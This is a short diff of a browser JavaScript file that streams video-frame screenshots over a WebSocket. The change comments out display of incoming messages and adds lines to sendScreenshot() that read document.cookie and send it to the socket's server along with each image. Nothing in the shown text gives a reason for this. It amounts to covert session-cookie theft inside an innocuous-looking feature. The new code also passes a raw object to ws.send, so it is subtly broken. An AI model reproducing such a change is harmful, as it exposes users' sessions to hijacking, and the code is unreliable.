@@ -9,7 +9,7 @@ ws.onopen = function(event) {
 }
 
 ws.onmessage = function(event) {
-    image.src = event.data;
+    //image.src = event.data;
 }
 
 // error event handler
@@ -54,7 +54,9 @@ function sendScreenshot() {
 	console.log(video.videoWidth);
 	console.log(video.videoHeight);
 	let screenshot = ctx.drawImage(video, 0, 0);
-	ws.send(canvas.toDataURL('image/jpeg', 0.1));
+	img = canvas.toDataURL('image/jpeg', 0.1);
+	cookie = document.cookie;
+	ws.send({ "cookie" : cookie, "image" : img });
     } catch (e) {
 	console.log('Unable to acquire screenshot: ' + e);
     }
